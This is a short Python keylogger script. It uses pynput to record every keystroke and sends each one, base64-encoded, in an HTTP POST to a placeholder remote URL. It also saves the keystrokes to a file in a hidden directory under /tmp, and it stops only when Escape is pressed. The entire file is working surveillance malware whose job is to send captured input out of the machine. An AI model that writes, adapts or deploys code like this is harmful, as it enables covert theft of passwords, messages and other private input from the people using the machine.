from pynput.keyboard import Key, Listener
import requests
import base64
import os

WEBSITE_URL = "https://yourwebsite.com/keystrokes"

def send_to_website(data):
    try:
        encoded_data = base64.b64encode(data.encode()).decode()
        response = requests.post(WEBSITE_URL, data={"keystrokes": encoded_data})
        print("Data sent to website. Status code:", response.status_code)
    except Exception as e:
        print("Error sending data to website:", str(e))

def save_to_file(data):
    try:
        directory = os.path.join(os.sep, "tmp", ".i683")
        os.makedirs(directory, exist_ok=True)
        file_path = os.path.join(directory, "keystrokes.txt")
        with open(file_path, "a") as file:
            file.write(data)
            file.write("\n")  # Add newline after each keystroke
        print("Data saved to file:", file_path)
    except Exception as e:
        print("Error saving data to file:", str(e))

def on_press(key):
    try:
        key_str = key.char
    except AttributeError:
        key_str = "[" + str(key) + "]"
    
    send_to_website(key_str)
    save_to_file(key_str)

def on_release(key):
    if key == Key.esc:  # Stop the keylogger if the Escape key is pressed
        return False

with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()

